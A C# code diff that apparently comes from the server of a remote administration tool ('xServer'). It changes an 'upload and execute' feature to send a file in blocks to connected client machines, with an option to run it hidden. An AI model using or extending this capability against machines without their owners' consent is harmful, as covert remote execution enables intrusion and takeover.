@@ -1,4 +1,5 @@
 ﻿using System;
+using System.IO;
 using System.Threading;
 using System.Windows.Forms;
 using xServer.Core;
@@ -482,8 +483,28 @@ namespace xServer.Forms
                             foreach (ListViewItem lvi in lstClients.SelectedItems)
                             {
                                 Client c = (Client)lvi.Tag;
-                                new Core.Packets.ServerPackets.UploadAndExecute(UploadAndExecute.File, UploadAndExecute.FileName, UploadAndExecute.RunHidden).Execute(c);
+
+                                FileSplit srcFile = new FileSplit(UploadAndExecute.FilePath);
+                                if (srcFile.MaxBlocks < 0)
+                                {
+                                    MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError), "Upload aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                                    break;
+                                }
+
+                                int ID = new Random().Next(int.MinValue, int.MaxValue - 1337); // ;)
+
                                 CommandHandler.HandleStatus(c, new Core.Packets.ClientPackets.Status("Uploading file..."));
+
+                                for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
+                                {
+                                    byte[] block;
+                                    if (!srcFile.ReadBlock(currentBlock, out block))
+                                    {
+                                        MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError), "Upload aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                                        break;
+                                    }
+                                    new Core.Packets.ServerPackets.UploadAndExecute(ID, Path.GetFileName(UploadAndExecute.FilePath) , block, srcFile.MaxBlocks, currentBlock, UploadAndExecute.RunHidden).Execute(c);
+                                }
                             }
                         }
                     }
